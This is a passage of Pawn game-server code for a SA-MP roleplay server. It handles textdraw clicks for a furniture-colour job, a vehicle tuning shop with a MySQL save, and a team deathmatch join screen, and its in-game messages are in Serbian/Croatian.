					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 18996, "mattextures", "sampwhite", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 18996, "mattextures", "sampred", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 2, 18996, "mattextures", "sampwhite", 0x00000000);
				}
			}
		    if(playertextid == PNamjestajColor_pTD[playerid][5]) {
				GameTextForPlayer( playerid, "~y~Sacekajte malo...", 8500, 1);
			    SetPlayerTimerEx(playerid, "posaoProizdvodacNamjestaja", 10000, false, "ii", playerid, 3);
       			CheckpointStatus[ playerid ] = 0;
		        posao_PNamjestajColorTDs(playerid, false);
		        SMG_DisablePlayerCheckpoint( playerid );

                if(NamjestajColorObject[playerid] == 19831) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.8779, 2745.9131, 13.4885, -90.0000, 0.0000, 270.0000);
	                MovePlayerObject(playerid, NamjestajObject[ playerid ], -2148.1528, 2745.9131, 13.4885, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 18646, "matcolours", "blue", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 18646, "matcolours", "blue", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 2, 18646, "matcolours", "blue", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 1518) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2135.9878, 2745.9131, 13.4845, 0.0000, 0.0000, 180.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2146.9878, 2745.9131, 13.4845, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 3, 18646, "matcolours", "blue", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 1738) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.0449, 2745.9146, 13.3795, 90.0000, 0.0000, 90.6001);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.5449, 2745.9146, 13.3795, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 18996, "mattextures", "sampwhite", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 18646, "matcolours", "blue", 0x00000000);					
				}
				else if(NamjestajColorObject[playerid] == 1782) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.0449, 2745.9146, 13.2915, 0.0000, 0.0000, 180.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.1969, 2745.9146, 13.3795, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 18646, "matcolours", "blue", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 2339) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2135.7527, 2745.4185, 13.8395, -90.0000, 0.0000, 0.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.0476, 2745.4185, 13.8395, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 18996, "mattextures", "sampwhite", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 18646, "matcolours", "blue", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 2, 18996, "mattextures", "sampwhite", 0x00000000);
				}
			}
		    if(playertextid == PNamjestajColor_pTD[playerid][6]) {
				GameTextForPlayer( playerid, "~y~Sacekajte malo...", 8500, 1);
			    SetPlayerTimerEx(playerid, "posaoProizdvodacNamjestaja", 10000, false, "ii", playerid, 3);
       			CheckpointStatus[ playerid ] = 0;
		        posao_PNamjestajColorTDs(playerid, false);
		        SMG_DisablePlayerCheckpoint( playerid );

                if(NamjestajColorObject[playerid] == 19831) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.8779, 2745.9131, 13.4885, -90.0000, 0.0000, 270.0000);
	                MovePlayerObject(playerid, NamjestajObject[ playerid ], -2148.1528, 2745.9131, 13.4885, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 19130, "matarrows", "green", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 19130, "matarrows", "green", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 2, 19130, "matarrows", "green", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 1518) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2135.9878, 2745.9131, 13.4845, 0.0000, 0.0000, 180.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2146.9878, 2745.9131, 13.4845, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 3, 19130, "matarrows", "green", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 1738) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.0449, 2745.9146, 13.3795, 90.0000, 0.0000, 90.6001);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.5449, 2745.9146, 13.3795, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 18996, "mattextures", "sampwhite", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 19130, "matarrows", "green", 0x00000000);					
				}
				else if(NamjestajColorObject[playerid] == 1782) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.0449, 2745.9146, 13.2915, 0.0000, 0.0000, 180.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.1969, 2745.9146, 13.3795, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 19130, "matarrows", "green", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 2339) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2135.7527, 2745.4185, 13.8395, -90.0000, 0.0000, 0.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.0476, 2745.4185, 13.8395, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 18996, "mattextures", "sampwhite", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 19130, "matarrows", "green", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 2, 18996, "mattextures", "sampwhite", 0x00000000);
				}
			}
		    if(playertextid == PNamjestajColor_pTD[playerid][7]) {
				GameTextForPlayer( playerid, "~y~Sacekajte malo...", 8500, 1);
			    SetPlayerTimerEx(playerid, "posaoProizdvodacNamjestaja", 10000, false, "ii", playerid, 3);
       			CheckpointStatus[ playerid ] = 0;
		        posao_PNamjestajColorTDs(playerid, false);
		        SMG_DisablePlayerCheckpoint( playerid );

                if(NamjestajColorObject[playerid] == 19831) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.8779, 2745.9131, 13.4885, -90.0000, 0.0000, 270.0000);
	                MovePlayerObject(playerid, NamjestajObject[ playerid ], -2148.1528, 2745.9131, 13.4885, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 1677, "wshxrefhse2", "yellowbeige_128", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 1677, "wshxrefhse2", "yellowbeige_128", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 2, 1677, "wshxrefhse2", "yellowbeige_128", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 1518) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2135.9878, 2745.9131, 13.4845, 0.0000, 0.0000, 180.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2146.9878, 2745.9131, 13.4845, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 3, 1677, "wshxrefhse2", "yellowbeige_128", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 1738) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.0449, 2745.9146, 13.3795, 90.0000, 0.0000, 90.6001);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.5449, 2745.9146, 13.3795, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 18996, "mattextures", "sampwhite", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 1677, "wshxrefhse2", "yellowbeige_128", 0x00000000);					
				}
				else if(NamjestajColorObject[playerid] == 1782) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2136.0449, 2745.9146, 13.2915, 0.0000, 0.0000, 180.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.1969, 2745.9146, 13.3795, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 1677, "wshxrefhse2", "yellowbeige_128", 0x00000000);
				}
				else if(NamjestajColorObject[playerid] == 2339) {
		            NamjestajObject[playerid] = CreatePlayerObject(playerid, NamjestajColorObject[playerid], -2135.7527, 2745.4185, 13.8395, -90.0000, 0.0000, 0.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2147.0476, 2745.4185, 13.8395, 1.0);

					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 0, 18996, "mattextures", "sampwhite", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 1, 1677, "wshxrefhse2", "yellowbeige_128", 0x00000000);
					SetPlayerObjectMaterial(playerid, NamjestajObject[ playerid ], 2, 18996, "mattextures", "sampwhite", 0x00000000);
				}
			}
			//
			if( playertextid == TuningMenu_pTD[ playerid ][ 9 ] ) // desno
			{
	            if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu." );
		        if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti na mestu vozaca." );

	            if( TPInfo[ playerid ][ tPaintjob ] == false )
				{
					new compid = -1, vehicleid = GetPlayerVehicleID( playerid );

		            for( new i = ( TPInfo[ playerid ][ tID ]+1 ); i < MAX_COMPONENTS; i++ )
					{
						if( cInfo[ i ][ cType ] == TPInfo[ playerid ][ tType ] )
						{
							if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) )
							{
								compid = i;
								break;
							}
						}
					}
					if( compid == -1 ) return SendErrorMessage( playerid, "Nema vise kompatibilnih komponenti izabrane vrste za vas model auta." );

		            RemoveVehicleComponent( vehicleid, cInfo[ TPInfo[ playerid ][ tID ] ][ cID ] );

		            TPInfo[ playerid ][ tID ] = compid;

		            format( globalstring, sizeof( globalstring ), "%s", cInfo[ compid ][ cName ] );
					PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 5 ], globalstring );

					if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
					{
					    new str[20];
						format( str, sizeof( str ), "Kupi($%d)", cInfo[ compid ][ cPrice ] );
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], str );
					}
					else
					{
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], "Postavi" );
					}

					AddVehicleComponent( vehicleid, cInfo[ compid ][ cID ] );

					SelectTextDraw( playerid, 0x4282C0FF );
				}
				else if( TPInfo[ playerid ][ tPaintjob ] == true ) {

				    new paintid = -1, vehicleid = GetPlayerVehicleID( playerid );

				    for( new i = ( TPInfo[ playerid ][ tID ]+1 ); i < NUMBER_TYPE_PAINTJOB; i++ ) {
				    	if( pjInfo[ i ][ vehID ] == GetVehicleModel( vehicleid ) ) {
							paintid = i;
							break;
						}
				   	}
				   	if( paintid == -1 ) return SendErrorMessage( playerid, "Nema vise kompatibilnih boja za vas model auta." );

	                TPInfo[ playerid ][ tID ] = paintid;

	                format( globalstring, sizeof( globalstring ), "%s", pjInfo[ paintid ][ pNameBre ] );
					PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 5 ], globalstring );

	                ChangeVehiclePaintjob( vehicleid, pjInfo[ paintid ][ pNumber ] );

	                SelectTextDraw( playerid, 0x4282C0FF );
				}
				return 1;
	        }
	        if( playertextid == TuningMenu_pTD[ playerid ][ 8 ] ) // levo
	        {
	            if( TPInfo[ playerid ][ tPaintjob ] == false )
				{
		            if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu." );
			        if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti na mestu vozaca." );

		            new compid = -1, vehicleid = GetPlayerVehicleID( playerid );

		            for( new i = (TPInfo[ playerid ][ tID ]-1); i > 0; i-- )
					{
						if( cInfo[ i ][ cType ] == TPInfo[ playerid ][ tType ] )
						{
							if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) )
							{
								compid = i;
								break;
							}
						}
					}
					if( compid == -1 ) return SendErrorMessage( playerid, "Nema vise kompatibilnih komponenti izabrane vrste za vas model auta." );

					RemoveVehicleComponent( vehicleid, cInfo[ TPInfo[ playerid ][ tID ] ][ cID ] );

		            TPInfo[ playerid ][ tID ] = compid;

		            format( globalstring, sizeof( globalstring ), "%s", cInfo[ compid ][ cName ] );
					PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 5 ], globalstring );

					if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
					{
					    new str[20];
						format( str, sizeof( str ), "Kupi($%d)", cInfo[ compid ][ cPrice ] );
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], str );
					}
					else
					{
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], "Postavi" );
					}

					AddVehicleComponent( vehicleid, cInfo[ compid ][ cID ] );

					SelectTextDraw( playerid, 0x4282C0FF );
				}
				else if( TPInfo[ playerid ][ tPaintjob ] == true )
				{
				    new paintid = -1, vehicleid = GetPlayerVehicleID( playerid );

				    for( new i = (TPInfo[ playerid ][ tID ]-1); i > 0; i-- )
					{
				    	if( pjInfo[ i ][ vehID ] == GetVehicleModel( vehicleid ) )
						{
							paintid = i;
							break;
						}
				   	}
				   	if( paintid == -1 ) return SendErrorMessage( playerid, "Nema vise kompatibilnih boja za vas model auta." );

	                TPInfo[ playerid ][ tID ] = paintid;

	                format( globalstring, sizeof( globalstring ), "%s", pjInfo[ paintid ][ pNameBre ] );
					PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 5 ], globalstring );

					if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
					{
					    new str[20];
						format( str, sizeof( str ), "Kupi($%d)", pjInfo[ paintid ][ pPrice ] );
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], str );
					}
					else
					{
						PlayerTextDrawSetString( playerid, TuningMenu_pTD[ playerid ][ 6 ], "Postavi" );
					}

	                ChangeVehiclePaintjob( vehicleid, pjInfo[ paintid ][ pNumber ] );

	                SelectTextDraw( playerid, 0x4282C0FF );
				}
				return 1;
	        }
	        if( playertextid == TuningMenu_pTD[ playerid ][ 6 ] ) // buy
	        {
	            if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu." );
		        if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti na mestu vozaca." );

	            new Float:Pos[ 6 ], vehicleid = GetPlayerVehicleID( playerid );

	            if( TPInfo[ playerid ][ tPaintjob ] == false )
				{
			        if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
					{
					    if( GetPlayerMoney( playerid ) < cInfo[ TPInfo[ playerid ][ tID ] ][ cPrice ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
						DajIgracuNovac(playerid, -cInfo[ TPInfo[ playerid ][ tID ] ][ cPrice ] );
						BussinesJobMoney( POSAO_MEHANICAR, cInfo[ TPInfo[ playerid ][ tID ] ][ cPrice ]/2 );
					}

					new cid = TPInfo[ playerid ][ tID ];

			        RemoveVehicleComponent( vehicleid, cInfo[ TPInfo[ playerid ][ tID ] ][ cID ] );

			        VehicleInfo[ vehicleid ][ vTuned ] = true;

			        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

			        if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
				    {
						if( VehicleInfo[ vehicleid ][ vUsage ] == PRIVATNO_VOZILO )
						{
							if( strcmp( ImeIgraca( playerid ), VehicleInfo[ vehicleid ][ vOwner ], true) == 0 )
						 	{
								SavePlayerVehicleTuning( vehicleid, cInfo[ cid ][ cID ] );
								VehicleInfo[ vehicleid ][ vTuned ] = 1;
								if( !IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ cid ][ cID ] ) ) RemoveVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );
							}
						}
				    }
				}
				else if( TPInfo[ playerid ][ tPaintjob ] == true )
				{
				    if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240))
					{
					    if( GetPlayerMoney( playerid ) < cInfo[ TPInfo[ playerid ][ tID ] ][ cPrice ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
						DajIgracuNovac(playerid, -cInfo[ TPInfo[ playerid ][ tID ] ][ cPrice ] );
						BussinesJobMoney( POSAO_MEHANICAR, cInfo[ TPInfo[ playerid ][ tID ] ][ cPrice ]/2 );
					}

				    new paintid = TPInfo[ playerid ][ tID ];

				    VehicleInfo[ vehicleid ][ vTuned ] = true;

				    VehicleInfo[ vehicleid ][ vPaintJob ] = pjInfo[ paintid ][ pNumber ];

				    SMG_ChangeVehicleColor( vehicleid, TPInfo[ playerid ][ PJColor ][ 0 ], TPInfo[ playerid ][ PJColor ][ 1 ] );

				    ChangeVehiclePaintjob( vehicleid, pjInfo[ paintid ][ pNumber ] );

				    if(IsPlayerInRangeOfPoint(playerid, 5.0, 1817.0668,-1411.8229,15.1240) && VehicleInfo[ vehicleid ][ vUsage ] == PRIVATNO_VOZILO)
				    {
				        if( strcmp( ImeIgraca( playerid ), VehicleInfo[ vehicleid ][ vOwner ], true) == 0 )
						{
						    VehicleInfo[ vehicleid ][ vPaintJob ] = pjInfo[ paintid ][ pNumber ];
							VehicleInfo[ vehicleid ][ vTuned ] = 1;

			                new q[ 128 ];
							mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_tuned` = '%d', `v_paintjob` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
												VehicleInfo[ vehicleid ][ vTuned ],
												VehicleInfo[ vehicleid ][ vPaintJob ],
												VehicleInfo[ vehicleid ][ vSqlID ] );

							mysql_tquery( mSQL, q );
						}
				    }
				}

				GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0, 6, 2 );
				SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

				GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
				SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

				CancelSelectTextDraw( playerid );

			    TuningTDShow( playerid, false );
			    SMG_TogglePlayerControllable( playerid, true );

				ShowPlayerDialog( playerid, dialog_TUNING, DIALOG_STYLE_LIST, D_NASLOV, "{4282C0}(1). {FFFFFF}Paintjobs\n{4282C0}(2). {FFFFFF}Colors\n{4282C0}(3). {FFFFFF}Exhausts\n{4282C0}(4). {FFFFFF}Front Bumper\n{4282C0}(5). {FFFFFF}Rear Bumper\n{4282C0}(6). {FFFFFF}Roof\n{4282C0}(7). {FFFFFF}Spoilers\n{4282C0}(8). {FFFFFF}Side Skirts\n{4282C0}(9). {FFFFFF}Wheels\n{4282C0}(10). {FFFFFF}Car Stereo\n{4282C0}(11). {FFFFFF}Hydraulics\n{4282C0}(12). {FFFFFF}Nitro", "Potvrdi", "Odustani" );
	            return 1;
			}
	        if( playertextid == TuningMenu_pTD[ playerid ][ 7 ] ) // close
			{
	            if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu." );
		        if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti na mestu vozaca." );

	            new Float:Pos[ 6 ], vehicleid = GetPlayerVehicleID( playerid );

				if( TPInfo[ playerid ][ tPaintjob ] == false ) {

			        RemoveVehicleComponent( vehicleid, cInfo[ TPInfo[ playerid ][ tID ] ][ cID ] );
				}
				else if( TPInfo[ playerid ][ tPaintjob ] == true ) {
				    ChangeVehiclePaintjob( vehicleid, 3 );
					SMG_ChangeVehicleColor( vehicleid, TPInfo[ playerid ][ PJColor ][ 0 ], TPInfo[ playerid ][ PJColor ][ 1 ] );
				}

				GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0, 6, 2 );
				SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

				GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
				SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

		        CancelSelectTextDraw( playerid );

				TuningTDShow( playerid, false );
			    SMG_TogglePlayerControllable( playerid, true );

				ShowPlayerDialog( playerid, dialog_TUNING, DIALOG_STYLE_LIST, D_NASLOV, "{4282C0}(1). {FFFFFF}Paintjobs\n{4282C0}(2). {FFFFFF}Colors\n{4282C0}(3). {FFFFFF}Exhausts\n{4282C0}(4). {FFFFFF}Front Bumper\n{4282C0}(5). {FFFFFF}Rear Bumper\n{4282C0}(6). {FFFFFF}Roof\n{4282C0}(7). {FFFFFF}Spoilers\n{4282C0}(8). {FFFFFF}Side Skirts\n{4282C0}(9). {FFFFFF}Wheels\n{4282C0}(10). {FFFFFF}Car Stereo\n{4282C0}(11). {FFFFFF}Hydraulics\n{4282C0}(12). {FFFFFF}Nitro", "Potvrdi", "Odustani" );
	            return 1;
			}
			//
			if( playertextid == tdm_player_tds[playerid][6] ) // x
			{
			    tdmTDControl( playerid, false );
			    return 1;
			}
			if( playertextid == tdm_player_tds[playerid][13] ) // levo
			{
			    if( tdm_player_info[ playerid ][ tdm_selectionNumber ] == 0 ) return SendErrorMessage( playerid, "Nema vise nazad." );

		        tdm_player_info[ playerid ][ tdm_selectionNumber ]--;

			    PlayerTextDrawSetString( playerid, tdm_player_tds[playerid][12], "~b~CT" );

			    PlayerTextDrawSetPreviewModel( playerid, tdm_player_tds[ playerid ][ 10 ], 285 );
				PlayerTextDrawShow( playerid, tdm_player_tds[ playerid ][ 10 ] );

				PlayerTextDrawSetPreviewModel( playerid, tdm_player_tds[ playerid ][ 17 ], 348 );
				PlayerTextDrawShow( playerid, tdm_player_tds[ playerid ][ 17 ] );
				PlayerTextDrawSetPreviewModel( playerid, tdm_player_tds[ playerid ][ 18 ], 349 );
				PlayerTextDrawShow( playerid, tdm_player_tds[ playerid ][ 18 ] );
				PlayerTextDrawSetPreviewModel( playerid, tdm_player_tds[ playerid ][ 19 ], 353 );
				PlayerTextDrawShow( playerid, tdm_player_tds[ playerid ][ 19 ] );
				PlayerTextDrawSetPreviewModel( playerid, tdm_player_tds[ playerid ][ 20 ], 356 );
				PlayerTextDrawShow( playerid, tdm_player_tds[ playerid ][ 20 ] );

			    return 1;
			}
			if( playertextid == tdm_player_tds[playerid][14] ) // desno
 			{
			    if( tdm_player_info[ playerid ][ tdm_selectionNumber ] == 1 ) return SendErrorMessage( playerid, "Nema vise napred." );

		        tdm_player_info[ playerid ][ tdm_selectionNumber ]++;

			    PlayerTextDrawSetString( playerid, tdm_player_tds[playerid][12], "~r~TT" );

			    PlayerTextDrawSetPreviewModel( playerid, tdm_player_tds[ playerid ][ 10 ], 293 );
				PlayerTextDrawShow( playerid, tdm_player_tds[ playerid ][ 10 ] );

				PlayerTextDrawSetPreviewModel( playerid, tdm_player_tds[ playerid ][ 17 ], 348 );
				PlayerTextDrawShow( playerid, tdm_player_tds[ playerid ][ 17 ] );
				PlayerTextDrawSetPreviewModel( playerid, tdm_player_tds[ playerid ][ 18 ], 349 );
				PlayerTextDrawShow( playerid, tdm_player_tds[ playerid ][ 18 ] );
				PlayerTextDrawSetPreviewModel( playerid, tdm_player_tds[ playerid ][ 19 ], 353 );
				PlayerTextDrawShow( playerid, tdm_player_tds[ playerid ][ 19 ] );
				PlayerTextDrawSetPreviewModel( playerid, tdm_player_tds[ playerid ][ 20 ], 355 );
				PlayerTextDrawShow( playerid, tdm_player_tds[ playerid ][ 20 ] );

			    return 1;
			}
			if( playertextid == tdm_player_tds[playerid][30] ) // join tdm
			{
				if( PlayerInfo[ playerid ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Ne mozes ako nisi level 5+." );
			    if( ( tdm_mapInfo[ tdm_ServerMap ][ ctPlayers ] + tdm_mapInfo[ tdm_ServerMap ][ ttPlayers ] ) >= 40 ) return SendErrorMessage( playerid, "Vec ima 40 igraca na TDM serveru, TDM server je pun." );
			    if( uInterijeru[ playerid ] != Interiors[5] ) return SendErrorMessage( playerid, "Moras biti u igraonici." );
			    if( tdm_player_info[ playerid ][ tdm_selectionNumber ] == 0 ) 
			    {
			        tdm_player_info[ playerid ][ tdm_Team ] = 1;

			        SetPlayerHealth( playerid, 100 );
					SetPlayerArmour( playerid, 100 );

					new rand = random( 3 );
					if( rand == 0 )
					{
			        	SMG_SetPlayerPos( playerid, tdm_mapInfo[ tdm_ServerMap ][ ctPos ][ 0 ], tdm_mapInfo[ tdm_ServerMap ][ ctPos ][ 1 ], tdm_mapInfo[ tdm_ServerMap ][ ctPos ][ 2 ] );
					}
					else if( rand == 1 )
					{
			        	SMG_SetPlayerPos( playerid, tdm_mapInfo[ tdm_ServerMap ][ ctPos1 ][ 0 ], tdm_mapInfo[ tdm_ServerMap ][ ctPos1 ][ 1 ], tdm_mapInfo[ tdm_ServerMap ][ ctPos1 ][ 2 ] );
					}
					else if( rand == 2 )
					{
			        	SMG_SetPlayerPos( playerid, tdm_mapInfo[ tdm_ServerMap ][ ctPos2 ][ 0 ], tdm_mapInfo[ tdm_ServerMap ][ ctPos2 ][ 1 ], tdm_mapInfo[ tdm_ServerMap ][ ctPos2 ][ 2 ] );
					}

					SetPlayerInterior( playerid, tdm_mapInfo[ tdm_ServerMap ][ mInt ] );
					SetPlayerVirtualWorld( playerid, tdm_mapInfo[ tdm_ServerMap ][ mVW] );

					UcitajObjekte( playerid );
					SetCameraBehindPlayer( playerid );

					GiveWeaponToPlayer( playerid, 24, 999 );
					GiveWeaponToPlayer( playerid, 25, 999 );
					GiveWeaponToPlayer( playerid, 29, 999 );
					GiveWeaponToPlayer( playerid, 31, 999 );

					SMG_SetPlayerSkin( playerid, 285 );

					tdm_mapInfo[ tdm_ServerMap ][ ctPlayers ]++;

					new tdm_str[ 20 ];
					format( tdm_str, sizeof( tdm_str ), "~b~score:_%03d", tdm_mapInfo[ tdm_ServerMap ][ ctScore ] );
					TextDrawSetString( TDM_gTD[ 17 ], tdm_str );
					format( tdm_str, sizeof( tdm_str ), "~r~score:_%03d", tdm_mapInfo[ tdm_ServerMap ][ ttScore ] );
					TextDrawSetString( TDM_gTD[ 19 ], tdm_str );

					format( tdm_str, sizeof( tdm_str ), "~b~players:_%02d", tdm_mapInfo[ tdm_ServerMap ][ ctPlayers ] );
					TextDrawSetString( TDM_gTD[ 18 ], tdm_str );
					format( tdm_str, sizeof( tdm_str ), "~r~players:_%02d", tdm_mapInfo[ tdm_ServerMap ][ ttPlayers ] );
					TextDrawSetString( TDM_gTD[ 20 ], tdm_str );
				}
			    else if( tdm_player_info[ playerid ][ tdm_selectionNumber ] == 1 ) {

			        tdm_player_info[ playerid ][ tdm_Team ] = 2;

			        SetPlayerHealth( playerid, 100 );
					SetPlayerArmour( playerid, 100 );

			        new rand = random( 3 );
					if( rand == 0 )
					{
			        	SMG_SetPlayerPos( playerid, tdm_mapInfo[ tdm_ServerMap ][ ttPos ][ 0 ], tdm_mapInfo[ tdm_ServerMap ][ ttPos ][ 1 ], tdm_mapInfo[ tdm_ServerMap ][ ttPos ][ 2 ] );
					}
					else if( rand == 1 )
					{
			        	SMG_SetPlayerPos( playerid, tdm_mapInfo[ tdm_ServerMap ][ ttPos1 ][ 0 ], tdm_mapInfo[ tdm_ServerMap ][ ttPos1 ][ 1 ], tdm_mapInfo[ tdm_ServerMap ][ ttPos1 ][ 2 ] );
					}
					else if( rand == 2 )
					{
			        	SMG_SetPlayerPos( playerid, tdm_mapInfo[ tdm_ServerMap ][ ttPos2 ][ 0 ], tdm_mapInfo[ tdm_ServerMap ][ ttPos2 ][ 1 ], tdm_mapInfo[ tdm_ServerMap ][ ttPos2 ][ 2 ] );
					}

					SetPlayerInterior( playerid, tdm_mapInfo[ tdm_ServerMap ][ mInt ] );
					SetPlayerVirtualWorld( playerid, tdm_mapInfo[ tdm_ServerMap ][ mVW] );

					UcitajObjekte( playerid );
					SetCameraBehindPlayer( playerid );

